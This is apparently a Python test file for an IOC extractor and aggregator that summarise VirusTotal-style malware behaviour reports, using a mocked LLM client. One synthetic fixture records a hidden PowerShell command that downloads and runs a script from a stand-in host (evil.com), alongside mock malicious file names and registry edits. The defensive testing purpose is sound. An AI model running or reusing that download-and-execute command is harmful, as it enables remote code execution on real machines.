"""
Tests for IOC extraction in raw mode (markdown output).
"""
from core.ioc_extractor import IOCExtractor
import logging


class MockLLMClient:
    """Mock LLM client for testing."""
    
    def __init__(self, response):
        self.response = response
        self.call_count = 0
    
    def complete_once(self, prompt, model=None, temperature=0.0, timeout=None, json_mode=False):
        self.call_count += 1
        self.last_prompt = prompt
        self.last_json_mode = json_mode
        return self.response


def test_raw_mode_success():
    """Test successful raw mode IOC extraction."""
    logger = logging.getLogger("test")
    config = {
        "llm": {
            "ioc_model": "test-model"
        },
        "ui": {
            "default_language": "en"
        }
    }
    extractor = IOCExtractor(logger, config)
    
    mock_response = """## Processes
- cmd.exe
- powershell.exe

## Network IPs
- 192.168.1.1
- 10.0.0.1

## Network Domains
- evil.com

## URLs
- http://evil.com/payload

## File Paths
- C:\\Windows\\Temp\\malware.exe

## Registry Keys
- HKLM\\Software\\Test

## Mutexes
- Global\\TestMutex

## YARA Rules
- TestYara1

## Sigma Rules
- TestSigma1

## Other IOCs
- PDB path: C:\\build\\malware.pdb
"""
    
    mock_client = MockLLMClient(mock_response)
    aggregated = {
        "basic": {"detections": 10, "type_description": "EXE", "names": ["test.exe"]},
        "processes": ["cmd.exe"],
        "network": ["192.168.1.1"]
    }
    
    result = extractor.run(mock_client, aggregated)
    
    # Verify success
    assert "raw_text" in result, f"Expected 'raw_text' key, got: {result.keys()}"
    assert "error" not in result, f"Unexpected error: {result.get('error')}"
    assert result["attempts"] == 1
    assert result["model"] == "test-model"
    assert mock_client.call_count == 1
    assert mock_client.last_json_mode == False, "Should not use JSON mode in raw mode"
    
    # Verify content
    raw_text = result["raw_text"]
    assert "## Processes" in raw_text
    assert "cmd.exe" in raw_text
    assert "## Network IPs" in raw_text
    assert "192.168.1.1" in raw_text
    
    print(f"✓ test_raw_mode_success - Got {len(raw_text)} chars of markdown")


def test_raw_mode_default():
    """Test that raw mode is always enabled."""
    logger = logging.getLogger("test")
    config = {"llm": {}}  # No config specified
    extractor = IOCExtractor(logger, config)
    
    # raw_mode attribute no longer exists, just verify extractor initializes
    assert extractor.raw_system_prompt is not None
    assert extractor.raw_user_template is not None
    print("✓ test_raw_mode_default - Raw mode is always enabled")


def test_legacy_mode_returns_error():
    """Test that config is now simpler without legacy mode checks."""
    logger = logging.getLogger("test")
    config = {
        "llm": {
            "ioc_model": "test-model"
        },
        "ui": {
            "default_language": "en"
        }
    }
    extractor = IOCExtractor(logger, config)
    
    # Should initialize successfully without legacy mode concerns
    assert extractor.raw_system_prompt is not None
    assert extractor.raw_user_template is not None
    
    print("✓ test_legacy_mode_returns_error - No legacy mode support needed")


def test_raw_mode_with_custom_prompts():
    """Test raw mode with custom prompts."""
    logger = logging.getLogger("test")
    custom_system = "Custom system prompt for testing"
    custom_template = "Custom template: {CONTEXT}"
    
    config = {
        "llm": {
            "ioc_raw_system_prompt": custom_system,
            "ioc_raw_user_template": custom_template,
            "ioc_model": "test-model"
        },
        "ui": {
            "default_language": "en"
        }
    }
    extractor = IOCExtractor(logger, config)
    
    assert extractor.raw_system_prompt == custom_system
    assert extractor.raw_user_template == custom_template
    
    mock_response = "## Processes\n- test.exe"
    mock_client = MockLLMClient(mock_response)
    aggregated = {"basic": {}, "processes": ["test.exe"]}
    
    result = extractor.run(mock_client, aggregated)
    
    assert "raw_text" in result
    # Verify custom prompts were used
    assert custom_system in mock_client.last_prompt
    assert "Custom template:" in mock_client.last_prompt
    
    print("✓ test_raw_mode_with_custom_prompts - Custom prompts work")


def test_raw_mode_truncates_long_context():
    """Test that raw mode truncates very long context."""
    logger = logging.getLogger("test")
    config = {
        "llm": {},
        "ui": {"default_language": "en"}
    }
    extractor = IOCExtractor(logger, config)
    
    # Create aggregated data with very long process list
    long_processes = [f"process_{i}.exe" for i in range(5000)]
    aggregated = {
        "basic": {"detections": 10, "type_description": "EXE", "names": ["test.exe"]},
        "processes": long_processes,
        "network": []
    }
    
    mock_response = "## Processes\n- (truncated)"
    mock_client = MockLLMClient(mock_response)
    
    result = extractor.run(mock_client, aggregated)
    
    assert "raw_text" in result
    # Verify prompt was truncated (should contain truncation message if > 20k chars)
    # This is hard to verify directly, but we can check it didn't fail
    assert result["attempts"] == 1
    
    print("✓ test_raw_mode_truncates_long_context - Handles long context")


def test_raw_mode_llm_failure():
    """Test raw mode error handling when LLM call fails."""
    logger = logging.getLogger("test")
    config = {
        "llm": {},
        "ui": {"default_language": "en"}
    }
    extractor = IOCExtractor(logger, config)
    
    class FailingMockClient:
        def complete_once(self, prompt, model=None, temperature=0.0, timeout=None, json_mode=False):
            raise Exception("LLM connection failed")
    
    failing_client = FailingMockClient()
    aggregated = {"basic": {}, "processes": []}
    
    result = extractor.run(failing_client, aggregated)
    
    # Verify error handling
    assert "error" in result
    assert "llm_call_failed" in result["error"]
    assert "raw_text" in result
    assert result["raw_text"] == ""
    assert result["attempts"] == 1
    
    print(f"✓ test_raw_mode_llm_failure - Error handled: {result['error'][:50]}...")


def test_section_headings_in_output():
    """Test that expected section headings appear in raw mode output."""
    logger = logging.getLogger("test")
    config = {
        "llm": {},
        "ui": {"default_language": "en"}
    }
    extractor = IOCExtractor(logger, config)
    
    # Mock response with all expected sections
    mock_response = """Brief introduction about IOCs found.

## File Names
- malware.exe
- payload.dll

## Processes
- process1.exe
- process2.exe

## Network IPs
- 1.2.3.4

## Network Domains
- example.com

## URLs
- http://example.com/path

## File Paths
- C:\\path\\to\\file.exe

## Registry Keys
- HKLM\\Software\\Key

## Mutexes
- Global\\Mutex1

## YARA Rules
- YaraRule1

## Sigma Rules
- SigmaRule1

## Other IOCs
- Some other indicator
"""
    
    mock_client = MockLLMClient(mock_response)
    aggregated = {"basic": {}, "processes": []}
    
    result = extractor.run(mock_client, aggregated)
    
    assert "raw_text" in result
    raw_text = result["raw_text"]
    
    # Verify all expected sections are present
    expected_sections = [
        "## File Names",
        "## Processes",
        "## Network IPs",
        "## Network Domains",
        "## URLs",
        "## File Paths",
        "## Registry Keys",
        "## Mutexes",
        "## YARA Rules",
        "## Sigma Rules",
        "## Other IOCs"
    ]
    
    for section in expected_sections:
        assert section in raw_text, f"Missing section: {section}"
    
    print("✓ test_section_headings_in_output - All sections present")


def test_aggregator_extended_iocs():
    """Test that aggregator extracts extended IOC categories."""
    from core.aggregator import Aggregator
    logger = logging.getLogger("test")
    aggregator = Aggregator(logger)
    
    # Create synthetic VT data with various IOC types
    vt_data = {
        "file_report": {
            "ok": True,
            "data": {
                "data": {
                    "attributes": {
                        "last_analysis_stats": {"malicious": 5, "suspicious": 2},
                        "size": 12345,
                        "md5": "abc123",
                        "sha256": "def456",
                        "type_description": "Win32 EXE",
                        "names": ["malware.exe", "evil.exe"]
                    }
                }
            }
        },
        "behaviour": {
            "ok": True,
            "data": {
                "processes": [
                    {"name": "cmd.exe", "command_line": "cmd.exe /c C:\\Windows\\Temp\\payload.exe"},
                    {"name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -c IEX(http://evil.com/script.ps1)"}
                ],
                "mutexes_created": ["Global\\TestMutex", "Local\\AnotherMutex"],
                "registry_keys_opened": ["HKEY_LOCAL_MACHINE\\Software\\Test"],
                "registry_keys_set": [
                    {"key": "HKLM\\Software\\Evil\\Config", "value": "malicious"}
                ],
                "network": {
                    "hosts": [
                        {"ip": "192.168.1.100", "domain": "evil.com"},
                        {"ip": "10.0.0.5"}
                    ]
                }
            }
        },
        "behaviours": {
            "ok": True,
            "data": {
                "crowdsourced_sigma_results": [
                    {
                        "rule_name": "TestSigmaRule",
                        "match_context": [
                            {
                                "values": {
                                    "Image": "C:\\Windows\\System32\\cmd.exe",
                                    "CommandLine": "cmd.exe /c reg add HKCU\\Software\\Test",
                                    "ParentImage": "C:\\Users\\User\\malware.exe"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
    
    result = aggregator.build_struct(vt_data)
    
    # Verify new categories are present
    assert "file_names" in result, "file_names key missing"
    assert "file_paths" in result, "file_paths key missing"
    assert "registry_keys" in result, "registry_keys key missing"
    assert "mutexes" in result, "mutexes key missing"
    assert "urls" in result, "urls key missing"
    assert "ip_addresses" in result, "ip_addresses key missing"
    assert "domains" in result, "domains key missing"
    
    # Verify content
    assert len(result["file_names"]) > 0, "No file names extracted"
    assert "malware.exe" in result["file_names"] or "evil.exe" in result["file_names"]
    
    assert len(result["file_paths"]) > 0, "No file paths extracted"
    assert any("C:\\Windows" in path or "C:\\Users" in path for path in result["file_paths"])
    
    assert len(result["registry_keys"]) > 0, "No registry keys extracted"
    
    assert len(result["mutexes"]) == 2, f"Expected 2 mutexes, got {len(result['mutexes'])}"
    assert "Global\\TestMutex" in result["mutexes"]
    
    assert len(result["ip_addresses"]) > 0, "No IPs extracted"
    assert "192.168.1.100" in result["ip_addresses"] or "10.0.0.5" in result["ip_addresses"]
    
    assert len(result["domains"]) > 0, "No domains extracted"
    assert "evil.com" in result["domains"]
    
    # URLs might be extracted from command line
    # This is optional as extraction depends on patterns
    
    print(f"✓ test_aggregator_extended_iocs - Extracted:")
    print(f"  - {len(result['file_names'])} file names")
    print(f"  - {len(result['file_paths'])} file paths")
    print(f"  - {len(result['registry_keys'])} registry keys")
    print(f"  - {len(result['mutexes'])} mutexes")
    print(f"  - {len(result['ip_addresses'])} IPs")
    print(f"  - {len(result['domains'])} domains")
    print(f"  - {len(result['urls'])} URLs")


def test_aggregator_truncation_cap():
    """Test that aggregator caps IOC categories at specified limit."""
    from core.aggregator import Aggregator
    logger = logging.getLogger("test")
    aggregator = Aggregator(logger)
    
    # Create data with > 40 file paths
    many_paths = [f"C:\\Path\\To\\File{i}.exe" for i in range(100)]
    many_reg_keys = [f"HKLM\\Software\\Key{i}" for i in range(100)]
    
    vt_data = {
        "file_report": {
            "ok": True,
            "data": {
                "data": {
                    "attributes": {
                        "last_analysis_stats": {"malicious": 1},
                        "names": ["test.exe"]
                    }
                }
            }
        },
        "behaviour": {
            "ok": True,
            "data": {
                "registry_keys_opened": many_reg_keys,
                "processes_created": many_paths
            }
        }
    }
    
    result = aggregator.build_struct(vt_data)
    
    # Verify capping (CAP = 40)
    assert len(result["file_paths"]) <= 40, f"file_paths not capped: {len(result['file_paths'])}"
    assert len(result["registry_keys"]) <= 40, f"registry_keys not capped: {len(result['registry_keys'])}"
    assert len(result["file_names"]) <= 40, f"file_names not capped: {len(result['file_names'])}"
    
    print(f"✓ test_aggregator_truncation_cap - Categories properly capped:")
    print(f"  - file_paths: {len(result['file_paths'])} (max 40)")
    print(f"  - registry_keys: {len(result['registry_keys'])} (max 40)")
    print(f"  - file_names: {len(result['file_names'])} (max 40)")


if __name__ == "__main__":
    test_raw_mode_success()
    test_raw_mode_default()
    test_legacy_mode_returns_error()
    test_raw_mode_with_custom_prompts()
    test_raw_mode_truncates_long_context()
    test_raw_mode_llm_failure()
    test_section_headings_in_output()
    test_aggregator_extended_iocs()
    test_aggregator_truncation_cap()
    
    print("\nAll IOC raw mode tests passed! ✅")


